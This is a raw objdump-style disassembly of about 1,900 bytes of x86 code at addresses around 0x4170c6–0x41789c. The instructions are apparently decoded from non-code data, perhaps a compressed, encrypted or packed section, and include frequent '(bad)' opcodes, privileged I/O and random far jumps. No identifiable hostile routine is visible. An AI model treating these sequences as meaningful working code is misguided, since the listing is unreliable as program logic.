  4170c6:	loop   0x41712c
  4170c8:	shr    DWORD PTR [edi],0xb5
  4170cb:	adc    bh,BYTE PTR [ecx-0x73]
  4170ce:	mov    WORD PTR ds:0x946f86c,gs
  4170d4:	mov    ebx,0xe9da0b89
  4170d9:	out    0x15,eax
  4170db:	dec    edx
  4170dc:	repz call 0xf8f3:0x9f110f81
  4170e4:	or     esp,ebp
  4170e6:	jae    0x4170dc
  4170e8:	into   
  4170e9:	ror    DWORD PTR [esi],cl
  4170eb:	xchg   ebp,eax
  4170ec:	dec    ecx
  4170ed:	mov    bl,bh
  4170ef:	cmp    ecx,DWORD PTR [esi]
  4170f1:	and    al,0x84
  4170f3:	addr16 add al,0x30
  4170f6:	lahf   
  4170f7:	je     0x4170a4
  4170f9:	hlt    
  4170fa:	mov    edx,0xd0aa049e
  4170ff:	aad    0xfb
  417101:	loopne 0x41708e
  417103:	fild   WORD PTR [ebx+0xb6e392c]
  417109:	jns    0x41717d
  41710b:	push   edx
  41710c:	jp     0x4170ad
  41710e:	jno    0x4170d2
  417110:	fwait
  417111:	cld    
  417112:	push   es
  417113:	mov    edx,?
  417115:	fwait
  417116:	es ret 0x33d9
  41711a:	inc    ecx
  41711b:	ret    
  41711c:	and    BYTE PTR [eax],dh
  41711e:	shr    ebp,cl
  417120:	aam    0xe7
  417122:	rol    BYTE PTR [edx+0x9],0xf3
  417126:	(bad)  
  417128:	dec    eax
  417129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41712a:	pop    edx
  41712b:	add    DWORD PTR [edi-0x3966c03],eax
  417131:	inc    ebp
  417132:	xor    ch,BYTE PTR [edx+0x20]
  417135:	mov    ebx,0x5b2ad9c6
  41713a:	out    dx,al
  41713b:	xor    al,0xc
  41713d:	icebp  
  41713e:	es pop eax
  417140:	push   esi
  417141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417142:	dec    esi
  417143:	xchg   ebx,eax
  417144:	xchg   ebx,eax
  417145:	std    
  417146:	lahf   
  417147:	xchg   DWORD PTR [ecx+esi*8-0x2a],esp
  41714b:	leave  
  41714c:	shl    DWORD PTR [eax-0x57],cl
  41714f:	add    al,0x57
  417151:	cmp    BYTE PTR [eax],0x1e
  417154:	repnz aaa 
  417156:	or     eax,0xa50c570e
  41715b:	pop    ds
  41715c:	push   esp
  41715d:	push   ecx
  41715e:	or     ecx,esi
  417160:	cmp    BYTE PTR [ecx-0x70c38500],ah
  417166:	xor    DWORD PTR [edx+0xd],edx
  417169:	add    al,dl
  41716b:	cdq    
  41716c:	iret   
  41716d:	inc    edx
  41716e:	(bad)  
  417170:	neg    DWORD PTR [esi]
  417172:	ds stos DWORD PTR es:[edi],eax
  417174:	xchg   ebx,eax
  417175:	es inc esp
  417177:	xchg   edx,eax
  417178:	inc    edi
  417179:	xor    DWORD PTR [eax+0x25dbdea3],ebp
  41717f:	pop    ss
  417180:	out    dx,eax
  417181:	or     BYTE PTR [esi],bh
  417183:	outs   dx,DWORD PTR ds:[esi]
  417184:	mov    al,0xa1
  417186:	jmp    0x417137
  417188:	fcmovnbe st,st(1)
  41718a:	xchg   ecx,eax
  41718b:	inc    edi
  41718c:	pop    ss
  41718d:	mov    ah,0xc9
  41718f:	mov    esp,0xe7528327
  417194:	pop    esp
  417195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417196:	ror    BYTE PTR [esp+ebx*4+0xc31823c],cl
  41719d:	pop    esi
  41719e:	xchg   edi,eax
  41719f:	inc    eax
  4171a0:	cli    
  4171a1:	sub    al,0xf5
  4171a3:	shl    DWORD PTR [edi-0x4b535480],cl
  4171a9:	nop
  4171aa:	mov    ds:0xa89878df,al
  4171af:	mov    edi,gs
  4171b1:	sti    
  4171b2:	pop    eax
  4171b3:	in     al,0x15
  4171b5:	(bad)  
  4171b6:	or     edi,DWORD PTR [ebp-0x35514dfa]
  4171bc:	sub    DWORD PTR ds:0x16f692c5,esp
  4171c2:	push   ebp
  4171c3:	xchg   ebp,eax
  4171c4:	or     al,0x2d
  4171c6:	je     0x417175
  4171c8:	fdiv   QWORD PTR [esi+0x75b5ecd5]
  4171ce:	inc    edx
  4171cf:	aam    0xff
  4171d1:	and    ebx,DWORD PTR [edi-0x7d]
  4171d4:	pop    edx
  4171d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d6:	jo     0x417207
  4171d8:	adc    dl,ch
  4171da:	cwde   
  4171db:	fdivr  st(6),st
  4171dd:	mov    dl,0x32
  4171df:	xor    al,BYTE PTR [eax+0x70]
  4171e2:	and    eax,0xd54e0260
  4171e7:	in     al,dx
  4171e8:	mov    DWORD PTR [edx+0x627f3c90],esp
  4171ee:	das    
  4171ef:	mov    ch,0x57
  4171f1:	adc    eax,0x4b016d3c
  4171f6:	(bad)  [eax-0x2a]
  4171f9:	je     0x41724b
  4171fb:	cmp    eax,ebx
  4171fd:	icebp  
  4171fe:	cli    
  4171ff:	xchg   ebx,eax
  417200:	and    BYTE PTR [ecx+0x3b7f6ba5],bl
  417206:	jo     0x4171be
  417208:	outs   dx,BYTE PTR ds:[esi]
  417209:	mov    eax,0x708038f
  41720e:	aaa    
  41720f:	push   0x23711d73
  417214:	in     eax,0xc7
  417216:	out    0x2d,al
  417218:	cld    
  417219:	cmp    edi,DWORD PTR [ecx*1-0x16fa992]
  417220:	or     bl,BYTE PTR [edi+edx*8+0x79ced3e7]
  417227:	mov    ds:0xff121071,eax
  41722c:	xchg   edi,eax
  41722d:	sbb    BYTE PTR [esi-0x49],ah
  417230:	nop
  417231:	sbb    al,0x2c
  417233:	ds pop eax
  417235:	hlt    
  417236:	adc    DWORD PTR [edi-0x33],esp
  417239:	sub    al,0xa1
  41723b:	pop    ebp
  41723c:	push   es
  41723d:	pop    es
  41723e:	push   ds
  41723f:	lods   al,BYTE PTR ds:[esi]
  417240:	add    edx,DWORD PTR ds:0x9baef5ea
  417246:	mov    edx,0xfdd28784
  41724b:	(bad)  
  41724c:	add    al,0xea
  41724e:	aad    0x18
  417250:	dec    edi
  417251:	mov    dh,0xe
  417253:	push   eax
  417254:	mov    ebx,0xaaaf6035
  417259:	iret   
  41725a:	pop    edx
  41725b:	adc    ah,bl
  41725d:	cmp    BYTE PTR [ecx],al
  41725f:	js     0x4171eb
  417261:	inc    ebx
  417262:	and    eax,0xc365b8ad
  417267:	push   esi
  417268:	aas    
  417269:	or     ch,BYTE PTR [ebx+edx*1]
  41726c:	mov    eax,ds:0xba8777d8
  417271:	xor    ebx,0xffffffae
  417274:	push   ebx
  417275:	enter  0xf799,0x32
  417279:	pop    eax
  41727a:	mov    eax,0x9d2bd9eb
  41727f:	sbb    BYTE PTR [edi],bl
  417281:	adc    al,0x7d
  417283:	or     al,0x3d
  417285:	and    dh,ch
  417287:	jp     0x41726e
  417289:	pop    esp
  41728a:	scas   eax,DWORD PTR es:[edi]
  41728b:	push   esi
  41728c:	cmp    eax,0x5a10e16d
  417291:	test   eax,0xf75ebaba
  417296:	out    0x13,al
  417298:	xchg   bh,ah
  41729a:	test   DWORD PTR [esi-0x682e3c78],edi
  4172a0:	cmp    ch,BYTE PTR [edi-0x34c0a735]
  4172a6:	add    ah,dh
  4172a8:	and    ah,BYTE PTR [ecx]
  4172aa:	jg     0x4172f0
  4172ac:	sahf   
  4172ad:	jae    0x417294
  4172af:	lea    ebp,[edi]
  4172b1:	xor    al,0xec
  4172b3:	xchg   esp,eax
  4172b4:	ins    DWORD PTR es:[edi],dx
  4172b5:	xchg   ebx,eax
  4172b6:	push   es
  4172b7:	stos   BYTE PTR es:[edi],al
  4172b8:	fcos   
  4172ba:	ficom  WORD PTR [ecx]
  4172bc:	sub    BYTE PTR [ebp+0x62a50328],dh
  4172c2:	pop    ds
  4172c3:	inc    ebp
  4172c4:	inc    dl
  4172c6:	or     dl,BYTE PTR ds:0x76a1376b
  4172cc:	or     DWORD PTR [edi],esp
  4172ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172cf:	mov    ebx,0x4f209bf3
  4172d4:	sbb    ebx,DWORD PTR [eax+0x25a18e5c]
  4172da:	call   edx
  4172dc:	cmp    al,0xd3
  4172de:	adc    al,0x9b
  4172e0:	push   edi
  4172e1:	stos   BYTE PTR es:[edi],al
  4172e2:	mov    dl,0xa7
  4172e4:	inc    ecx
  4172e5:	jecxz  0x417329
  4172e7:	in     eax,0xd0
  4172e9:	push   0xef9551e4
  4172ee:	dec    edx
  4172ef:	inc    esp
  4172f0:	add    eax,0x2f133763
  4172f5:	mov    WORD PTR [ebp+0x264f98c3],cs
  4172fb:	mov    dh,0x22
  4172fd:	rcl    DWORD PTR [ebx-0x80],0xa5
  417301:	or     BYTE PTR [ecx+0x63],ch
  417304:	sbb    DWORD PTR [edx+0x39],esp
  417307:	iret   
  417308:	mov    cl,0xad
  41730a:	jbe    0x41730a
  41730c:	stc    
  41730d:	cmp    DWORD PTR [edi-0x20b315f9],esp
  417313:	out    dx,eax
  417314:	jne    0x4172ab
  417316:	(bad)  
  417317:	retf   0x864d
  41731a:	and    BYTE PTR ds:0x1a0f3ca8,dl
  417320:	clc    
  417321:	pop    eax
  417322:	and    BYTE PTR ds:0x959baabc,ah
  417328:	adc    al,0x68
  41732a:	fild   QWORD PTR [ecx+0x65bf0186]
  417330:	les    ebx,FWORD PTR ds:0x4d172b43
  417336:	sbb    BYTE PTR [eax],bh
  417338:	in     eax,0x14
  41733a:	add    edx,eax
  41733c:	popa   
  41733d:	push   0x49b291e9
  417342:	in     al,dx
  417343:	jle    0x417381
  417345:	in     al,0x2e
  417347:	js     0x4173bc
  417349:	adc    BYTE PTR [ebx+esi*2-0x6fdbcfb5],bh
  417350:	adc    ch,BYTE PTR [eax-0x5bc23777]
  417356:	int3   
  417357:	scas   eax,DWORD PTR es:[edi]
  417358:	jp     0x417386
  41735a:	div    DWORD PTR [esi]
  41735c:	nop
  41735d:	jp     0x417329
  41735f:	in     eax,dx
  417360:	jmp    0x677e:0x3d04207
  417367:	mov    bl,0xd4
  417369:	ins    BYTE PTR es:[edi],dx
  41736a:	aad    0xd
  41736c:	stc    
  41736d:	adc    BYTE PTR [ebp+0x75],0x4f
  417371:	sbb    bl,BYTE PTR [esi+0x7]
  417374:	pop    ebx
  417375:	rcr    DWORD PTR [edi+0x22e64206],1
  41737b:	pop    ds
  41737c:	lock iret 
  41737e:	push   es
  41737f:	dec    edi
  417380:	cmp    dl,BYTE PTR [ebx+0x33]
  417383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417384:	not    BYTE PTR cs:[eax+0x50aefcf1]
  41738b:	je     0x4173db
  41738d:	test   al,0x5f
  41738f:	test   eax,0x910eec9b
  417394:	pop    ecx
  417395:	push   ebp
  417396:	in     al,dx
  417397:	into   
  417398:	inc    esp
  417399:	push   es
  41739a:	jno    0x417411
  41739c:	lock or BYTE PTR [edx+0x60],0xad
  4173a1:	jbe    0x417413
  4173a3:	cmc    
  4173a4:	out    0x32,al
  4173a6:	icebp  
  4173a7:	sbb    al,al
  4173a9:	add    dh,BYTE PTR [ebp+0x29]
  4173ac:	add    BYTE PTR [edx+0x4f],dl
  4173af:	scas   eax,DWORD PTR es:[edi]
  4173b0:	js     0x417345
  4173b2:	inc    ebp
  4173b3:	xchg   BYTE PTR [esi-0xaff9c97],cl
  4173b9:	sar    BYTE PTR [edi-0x56d7949e],cl
  4173bf:	das    
  4173c0:	pop    ecx
  4173c1:	cmp    ecx,edi
  4173c3:	or     DWORD PTR [eax-0x108e35a1],0xd88bf28c
  4173cd:	push   ebp
  4173ce:	out    dx,al
  4173cf:	cwde   
  4173d0:	rcr    BYTE PTR [ecx],0xf
  4173d3:	ror    esi,1
  4173d5:	(bad)  
  4173d6:	lock pop eax
  4173d8:	jmp    0x4173e3
  4173da:	enter  0x7f67,0x1d
  4173de:	cmp    BYTE PTR [esi-0x77463964],al
  4173e4:	mov    esi,DWORD PTR [ecx+ecx*2+0x7d]
  4173e8:	ret    
  4173e9:	jge    0x417421
  4173eb:	xlat   BYTE PTR ds:[ebx]
  4173ec:	mov    ds:0xf8d57e,al
  4173f1:	sbb    al,0x51
  4173f3:	dec    ebp
  4173f4:	je     0x41743c
  4173f6:	call   0x315c:0xa3305784
  4173fd:	mov    bh,0xfd
  4173ff:	mov    eax,0x982f1ffd
  417404:	xchg   edi,eax
  417405:	les    edi,FWORD PTR [eax+0x51]
  417408:	pop    dx
  41740a:	sub    al,0x7e
  41740c:	jg     0x4173cd
  41740e:	adc    eax,0x17c81cd2
  417413:	lods   al,BYTE PTR ds:[esi]
  417414:	and    esi,edx
  417416:	or     ecx,edx
  417418:	pop    esp
  417419:	jne    0x4173b4
  41741b:	int3   
  41741c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41741d:	mov    dl,0xf9
  41741f:	pop    ebp
  417420:	cmp    ecx,DWORD PTR [ecx]
  417422:	pop    ecx
  417423:	loopne 0x417489
  417425:	mov    BYTE PTR [eax+0x6963a294],ah
  41742b:	push   eax
  41742c:	push   eax
  41742d:	ret    0xbd98
  417430:	sub    BYTE PTR [ecx+edi*1],0xdf
  417434:	sbb    al,0xec
  417436:	mov    dh,0x1f
  417438:	test   esi,esi
  41743a:	iret   
  41743b:	pop    ecx
  41743c:	xor    edx,edx
  41743e:	mov    bl,0x19
  417440:	pop    edx
  417441:	mov    al,0xe
  417443:	mov    gs,WORD PTR [ebp+0x5]
  417446:	data16 jge 0x41748c
  417449:	jp     0x417496
  41744b:	inc    edx
  41744c:	pop    ecx
  41744d:	xchg   edx,eax
  41744e:	sbb    ebp,edx
  417450:	jl     0x417462
  417452:	lods   eax,DWORD PTR ds:[esi]
  417453:	(bad)  gs:[edi+0x15288c54]
  41745a:	sub    ah,bh
  41745c:	shr    DWORD PTR ds:0xeceed770,1
  417462:	sub    BYTE PTR [edi+0x47],dl
  417465:	dec    ecx
  417466:	jns    0x417433
  417468:	loop   0x417408
  41746a:	dec    esi
  41746b:	pop    esp
  41746c:	imul   edi,DWORD PTR [edx+ecx*1],0x5b411eae
  417473:	jmp    0x103c2ab8
  417478:	and    al,BYTE PTR [ebx+0x7f]
  41747b:	lock add BYTE PTR [ebx],ah
  41747e:	fsub   DWORD PTR [eax-0x31]
  417481:	sub    dh,dl
  417483:	push   esi
  417484:	jns    0x417426
  417486:	mov    WORD PTR [esi+0x47f17d77],es
  41748c:	inc    eax
  41748d:	xchg   BYTE PTR [edi-0x7f],al
  417490:	adc    dl,BYTE PTR [eax-0x8866cb]
  417496:	add    bl,BYTE PTR [edx+edi*1-0x63]
  41749a:	and    cl,BYTE PTR [edx-0x25fce45a]
  4174a0:	js     0x4174c1
  4174a2:	or     al,0x8e
  4174a4:	inc    esi
  4174a5:	dec    ebx
  4174a6:	jo     0x41751e
  4174a8:	stc    
  4174a9:	xchg   bl,al
  4174ab:	inc    ecx
  4174ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ad:	pushf  
  4174ae:	aaa    
  4174af:	and    BYTE PTR [esi+0x1337c064],bh
  4174b5:	pop    ebx
  4174b6:	(bad)  
  4174b7:	push   eax
  4174b8:	lock inc edx
  4174ba:	or     al,0xb2
  4174bc:	aam    0xcb
  4174be:	jnp    0x41751f
  4174c0:	adc    BYTE PTR [ecx-0x3d9f7897],ah
  4174c6:	push   ebx
  4174c7:	call   0x13671d9
  4174cc:	jg     0x4174ed
  4174ce:	(bad)  
  4174cf:	xor    eax,0x66a352c0
  4174d4:	(bad)  
  4174d5:	inc    ebx
  4174d6:	imul   bh
  4174d8:	pusha  
  4174d9:	cmp    bl,cl
  4174db:	rol    BYTE PTR [ebx+ebp*2-0x3bff509e],1
  4174e2:	pop    ds
  4174e3:	ins    BYTE PTR es:[edi],dx
  4174e4:	into   
  4174e5:	in     al,0x2d
  4174e7:	mov    ds:0xa82fc389,eax
  4174ec:	xchg   ebp,eax
  4174ee:	sub    dl,bl
  4174f0:	loopne 0x4174a5
  4174f2:	sar    DWORD PTR [esi+0x6e73828a],0x54
  4174f9:	loop   0x417572
  4174fb:	imul   esp,eax,0x12d72571
  417501:	ins    DWORD PTR es:[edi],dx
  417502:	or     al,0x3e
  417504:	stc    
  417505:	jecxz  0x4174bb
  417507:	or     BYTE PTR [ebp+esi*1+0x6b],0xf2
  41750c:	jnp    0x417528
  41750e:	mov    edx,0x7e23355b
  417513:	ins    DWORD PTR es:[edi],dx
  417514:	fwait
  417515:	aas    
  417516:	(bad)  
  417517:	in     eax,0x66
  417519:	aaa    
  41751a:	mov    dl,BYTE PTR ds:0x91b30e4d
  417520:	jl     0x41750b
  417522:	push   esp
  417523:	xor    BYTE PTR [edx+eax*8-0xf],0x85
  417528:	inc    ebp
  417529:	jns    0x41759b
  41752b:	dec    edx
  41752c:	je     0x417591
  41752e:	fnstsw WORD PTR [ebx-0x2d21ddcd]
  417534:	leave  
  417535:	mov    WORD PTR [esi+edi*8+0x1c],fs
  417539:	adc    eax,0xe75da314
  41753e:	les    ebp,FWORD PTR [eax]
  417540:	dec    esp
  417541:	stos   BYTE PTR es:[edi],al
  417542:	push   edx
  417543:	mov    ds:0x35a11f01,eax
  417548:	inc    esi
  417549:	dec    ebx
  41754a:	fwait
  41754b:	sti    
  41754c:	jbe    0x4174e0
  41754e:	sbb    ah,ah
  417550:	jmp    0xc3e0:0x4e49db2
  417557:	ss cmp eax,0x414864a9
  41755d:	adc    edx,DWORD PTR [ecx]
  41755f:	push   edi
  417560:	loop   0x4175af
  417562:	pop    ebp
  417563:	jno    0x41753e
  417565:	and    ebp,DWORD PTR [edi+0x42]
  417568:	inc    ebx
  417569:	inc    edi
  41756a:	and    cl,BYTE PTR [edi]
  41756c:	xor    BYTE PTR [esi-0x30c7627c],ah
  417572:	mov    cl,ch
  417574:	clc    
  417575:	cld    
  417576:	mov    eax,ds:0xd213173
  41757b:	popa   
  41757c:	out    dx,al
  41757d:	shl    BYTE PTR [esi-0x2cd72ca0],1
  417583:	sub    eax,esp
  417585:	data16 das 
  417587:	mov    ebp,0xa6b2cc70
  41758c:	cwde   
  41758d:	clc    
  41758e:	push   0x541dfa98
  417593:	stos   DWORD PTR es:[edi],eax
  417594:	arpl   WORD PTR [eax-0x7b],bp
  417597:	mov    cl,0x90
  417599:	push   es
  41759a:	sub    edi,DWORD PTR [edi+0x32]
  41759d:	das    
  41759e:	hlt    
  41759f:	mov    esi,0x41361884
  4175a4:	xor    BYTE PTR [ebx-0x6b4d86ed],ch
  4175aa:	mov    edx,DWORD PTR [eax+ebp*4]
  4175ad:	nop
  4175ae:	in     al,0xb2
  4175b0:	pop    edi
  4175b1:	adc    DWORD PTR [edx+0x5df4db68],ebp
  4175b7:	mov    cl,0x70
  4175b9:	xchg   ebp,eax
  4175ba:	lods   al,BYTE PTR ds:[esi]
  4175bb:	and    BYTE PTR [edx],bl
  4175bd:	cwde   
  4175be:	push   eax
  4175bf:	cmp    cl,BYTE PTR [edi+0x4]
  4175c2:	in     eax,0x22
  4175c4:	push   ebx
  4175c5:	jmp    DWORD PTR [edx]
  4175c7:	(bad)  
  4175c8:	lods   eax,DWORD PTR ds:[esi]
  4175c9:	xchg   edi,eax
  4175ca:	adc    eax,DWORD PTR [edx-0x67]
  4175cd:	arpl   si,bx
  4175cf:	dec    ecx
  4175d0:	test   eax,0x7a90b602
  4175d5:	pop    es
  4175d6:	sbb    cl,dh
  4175d8:	fadd   QWORD PTR [ebx+0x6c]
  4175db:	idiv   BYTE PTR ds:0xa86474c6
  4175e1:	(bad)  
  4175e2:	sub    ebp,ebx
  4175e4:	sub    bh,bh
  4175e6:	xor    eax,0x971724d0
  4175eb:	pop    es
  4175ec:	sbb    al,0xb2
  4175ef:	in     al,dx
  4175f0:	jl     0x4175a8
  4175f2:	mov    esp,edx
  4175f4:	jecxz  0x417658
  4175f6:	hlt    
  4175f7:	cld    
  4175f8:	fisttp DWORD PTR [ecx-0xf250fb]
  4175fe:	sti    
  4175ff:	cmp    dl,dh
  417601:	mov    ebx,0x970f10a3
  417606:	in     eax,dx
  417607:	lea    edx,[ebp+0x73615fd7]
  41760d:	push   0x32
  41760f:	push   edx
  417610:	repnz push esi
  417612:	push   edi
  417613:	sahf   
  417614:	aaa    
  417615:	push   esi
  417616:	or     cl,BYTE PTR [eax]
  417618:	add    ah,BYTE PTR [edi+0xdc7f08a]
  41761e:	cmp    ebx,edx
  417620:	mov    bl,0x1d
  417622:	sbb    al,0x34
  417624:	pop    es
  417625:	loope  0x4175ab
  417627:	mov    esi,0xf4872588
  41762c:	dec    edx
  41762d:	mov    ah,0x96
  41762f:	inc    eax
  417630:	addr16 xchg ebx,eax
  417632:	loope  0x41767c
  417634:	push   ds
  417635:	mov    ch,0x2b
  417637:	aam    0x13
  417639:	shl    ecx,cl
  41763b:	pop    eax
  41763c:	sahf   
  41763d:	js     0x417693
  41763f:	push   ds
  417640:	mov    ecx,0x912a265f
  417645:	push   0xb3390fbc
  41764a:	push   esi
  41764b:	mov    esi,0x9b973f38
  417650:	pop    ebp
  417651:	test   DWORD PTR [ecx],ecx
  417653:	jmp    0x289:0xf6bb7299
  41765a:	sbb    eax,0x74e0dd13
  41765f:	inc    eax
  417660:	outs   dx,BYTE PTR ds:[esi]
  417661:	pop    esi
  417662:	jmp    0x37481d62
  417667:	repnz mov BYTE PTR [edi],dh
  41766a:	cmc    
  41766b:	cmp    DWORD PTR [edx+0x63599677],0xffffff99
  417672:	outs   dx,BYTE PTR ds:[esi]
  417673:	(bad)  
  417675:	lahf   
  417676:	adc    dh,BYTE PTR [ebx+0x24]
  417679:	pop    es
  41767a:	stc    
  41767b:	jle    0x417643
  41767d:	scas   al,BYTE PTR es:[edi]
  41767e:	ret    0x45eb
  417681:	add    edx,DWORD PTR [ebp+0x1a]
  417684:	repnz add eax,0x4cedccfe
  41768a:	shl    DWORD PTR [eax+eiz*4+0x7b],cl
  41768e:	(bad)  
  41768f:	pop    esp
  417690:	aaa    
  417691:	jnp    0x41763a
  417693:	mov    DWORD PTR [edi],eax
  417695:	loop   0x417698
  417697:	adc    esi,ebp
  417699:	lea    ebp,[ecx-0x21b8c74a]
  41769f:	xchg   edi,eax
  4176a0:	mov    WORD PTR [eax-0x15d11c24],cs
  4176a6:	sbb    ah,BYTE PTR [ebx+ecx*1]
  4176a9:	jge    0x417631
  4176ab:	imul   esi,DWORD PTR [esi-0x7a],0x34
  4176af:	sbb    eax,0x785df1da
  4176b4:	or     al,0x8d
  4176b6:	loope  0x4176c8
  4176b8:	jg     0x4176ec
  4176ba:	out    dx,al
  4176bb:	xchg   ecx,eax
  4176bc:	cs adc eax,ebx
  4176bf:	fsubr  st,st(5)
  4176c1:	jo     0x4176c0
  4176c3:	xchg   edi,eax
  4176c4:	push   ebp
  4176c5:	jo     0x41770b
  4176c7:	cmp    cl,BYTE PTR [ecx+0x7b4bc486]
  4176cd:	mov    ebx,0x951bc4c4
  4176d2:	(bad)  
  4176d3:	repnz cld 
  4176d5:	(bad)  
  4176d6:	mov    al,ds:0x6a2fc7e8
  4176db:	ds fucom st(7)
  4176de:	imul   ebx,DWORD PTR [ecx-0x34],0xffffffcc
  4176e2:	mov    eax,ds:0x5c30733
  4176e7:	dec    ebx
  4176e8:	arpl   WORD PTR [eax+0x79],cx
  4176eb:	mov    al,0x2a
  4176ed:	sub    al,0xf4
  4176ef:	aam    0xf7
  4176f1:	add    DWORD PTR [ecx-0x1a],esp
  4176f4:	pop    ds
  4176f5:	ret    0x19a6
  4176f8:	sub    bh,BYTE PTR [ecx-0x24af7c8d]
  4176fe:	ficom  DWORD PTR [eax+0x29]
  417701:	mov    ebx,0xbe207dbc
  417706:	push   eax
  417707:	leave  
  417708:	and    bh,BYTE PTR [ecx+eax*8]
  41770b:	gs jns 0x417735
  41770e:	push   eax
  41770f:	jmp    0xa8916db9
  417714:	add    eax,0xc259bcb8
  417719:	fisubr WORD PTR [ebx+0x7397b6ea]
  41771f:	out    0x73,al
  417721:	es or  edx,edx
  417724:	in     eax,dx
  417725:	out    dx,eax
  417726:	imul   ebp,DWORD PTR [ebp-0x5d],0x94bf4fb8
  41772d:	mov    eax,0x522e18b6
  417732:	and    al,0x28
  417734:	rol    DWORD PTR [esp-0x6f6ed5d1],cl
  41773b:	mov    bh,0x30
  41773d:	inc    edi
  41773e:	push   esi
  41773f:	jno    0x417774
  417741:	pop    ecx
  417742:	popa   
  417743:	rcl    BYTE PTR [edx-0x6b],cl
  417746:	int3   
  417747:	or     eax,0x996572c3
  41774c:	jp     0x417705
  41774e:	and    eax,0xd616aa2e
  417753:	ret    0x746a
  417756:	ds ret 
  417758:	mov    eax,ds:0xc94ea6e3
  41775d:	(bad)  
  41775f:	xor    ah,BYTE PTR [ecx-0x7362f9d]
  417765:	add    eax,0x8a08e3fc
  41776a:	mov    al,ds:0xd748fc7b
  41776f:	in     eax,dx
  417770:	sbb    al,bh
  417772:	(bad)  
  417773:	aam    0x36
  417775:	sbb    BYTE PTR [edi+0x8],ah
  417778:	push   ss
  417779:	xor    BYTE PTR [esi+edi*8-0x7b],0xce
  41777e:	ror    DWORD PTR [ecx-0x52017120],cl
  417784:	push   esp
  417785:	pop    edi
  417787:	ins    BYTE PTR es:[edi],dx
  417788:	les    eax,FWORD PTR [ebx-0x444504f9]
  41778e:	pop    ebp
  41778f:	bound  ebp,QWORD PTR [eax+0x1e1103fd]
  417795:	scas   eax,DWORD PTR es:[edi]
  417796:	adc    BYTE PTR [edi],bl
  417798:	jae    0x417776
  41779a:	lods   eax,DWORD PTR ds:[esi]
  41779b:	mov    BYTE PTR [ebx+esi*1],0x25
  41779f:	shr    BYTE PTR [edx+0x54],0x5
  4177a3:	repz add ch,bl
  4177a6:	mov    DWORD PTR [ebx+0x7c],ecx
  4177a9:	shl    DWORD PTR [ebx],1
  4177ab:	pusha  
  4177ac:	xor    al,0xc7
  4177ae:	pop    edi
  4177af:	icebp  
  4177b0:	stos   DWORD PTR es:[edi],eax
  4177b1:	das    
  4177b2:	out    dx,al
  4177b3:	push   ebp
  4177b4:	lea    ebp,ds:0x6d3f2bab
  4177ba:	push   edx
  4177bb:	pop    eax
  4177bc:	xchg   esi,eax
  4177bd:	jg     0x4177f0
  4177bf:	div    DWORD PTR [ebx]
  4177c1:	loop   0x4177c5
  4177c3:	dec    eax
  4177c4:	pop    edx
  4177c5:	dec    eax
  4177c6:	bound  ecx,QWORD PTR [edx+0x69]
  4177c9:	inc    ebx
  4177ca:	push   0x14e19742
  4177cf:	push   ss
  4177d0:	dec    esi
  4177d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d2:	pusha  
  4177d3:	mov    cl,BYTE PTR [esi+0x4a]
  4177d6:	ret    
  4177d7:	jb     0x417829
  4177d9:	push   cs
  4177da:	push   0x7785eb39
  4177df:	pop    ss
  4177e0:	int3   
  4177e1:	ficom  WORD PTR [edx-0x63]
  4177e4:	(bad)  
  4177e5:	out    0xb8,eax
  4177e7:	pop    ds
  4177e8:	adc    al,0xf1
  4177ea:	retf   
  4177eb:	and    edx,DWORD PTR [eax+0x5c]
  4177ee:	xor    al,0xbc
  4177f0:	pop    edi
  4177f1:	mov    al,0x72
  4177f3:	fs sub eax,0xded616eb
  4177f9:	test   eax,0x9a3c8133
  4177fe:	and    bl,dh
  417800:	jl     0x4177a2
  417802:	jb     0x417812
  417804:	aaa    
  417805:	jmp    0x3b1a:0x97e0e496
  41780c:	in     eax,0x92
  41780e:	pop    eax
  41780f:	in     eax,dx
  417810:	clc    
  417811:	into   
  417812:	and    esi,DWORD PTR [ebx+ecx*1-0x1b]
  417816:	mov    ch,BYTE PTR ds:0x4dd63c83
  41781c:	stc    
  41781d:	stos   BYTE PTR es:[edi],al
  41781e:	pop    cx
  417820:	into   
  417821:	jb     0x417872
  417823:	retf   
  417824:	mov    ecx,0x16b431dd
  417829:	pop    ecx
  41782a:	repz push ebx
  41782c:	sbb    DWORD PTR [ebp-0x49],edi
  41782f:	push   es
  417830:	ins    DWORD PTR es:[edi],dx
  417831:	inc    eax
  417832:	sub    eax,0x812d42aa
  417837:	xchg   ecx,eax
  417838:	adc    BYTE PTR [eax],bh
  41783a:	inc    esi
  41783b:	inc    esi
  41783c:	cwde   
  41783d:	jmp    0x4177f3
  41783f:	lods   eax,DWORD PTR ds:[esi]
  417840:	aas    
  417841:	je     0x4177eb
  417843:	popf   
  417844:	les    eax,FWORD PTR [edi+0x6a]
  417847:	shl    esi,cl
  417849:	sbb    BYTE PTR [ebx],ch
  41784b:	arpl   sp,bx
  41784d:	xor    eax,0x7ff8cf28
  417852:	xor    al,0xbb
  417854:	dec    ecx
  417855:	xchg   ebx,eax
  417856:	push   esi
  417857:	gs fstp TBYTE PTR ss:[esi]
  41785b:	stc    
  41785c:	pop    ds
  41785d:	in     eax,0x4
  41785f:	inc    edx
  417860:	je     0x4178d2
  417862:	cli    
  417863:	fidiv  WORD PTR [ebx-0x7]
  417866:	sbb    ebx,DWORD PTR [ecx+0x6ed1de06]
  41786c:	lea    ebp,[edi+0x7a9665a5]
  417872:	fwait
  417873:	push   ebp
  417874:	cwde   
  417875:	mov    BYTE PTR ds:0x891ed2e9,0x19
  41787c:	jmp    0x4178a3
  41787e:	add    al,0x14
  417880:	cmp    edx,DWORD PTR [edi+0x61]
  417883:	inc    bl
  417885:	sbb    al,BYTE PTR [ecx]
  417887:	pop    eax
  417888:	xchg   ecx,eax
  417889:	ret    0x162b
  41788c:	daa    
  41788d:	or     dh,bh
  41788f:	push   ebp
  417890:	sahf   
  417891:	and    cl,bl
  417893:	dec    ecx
  417894:	add    eax,0x9dc2185f
  417899:	(bad)  
  41789a:	jno    0x4178dd
  41789c:	aaa    
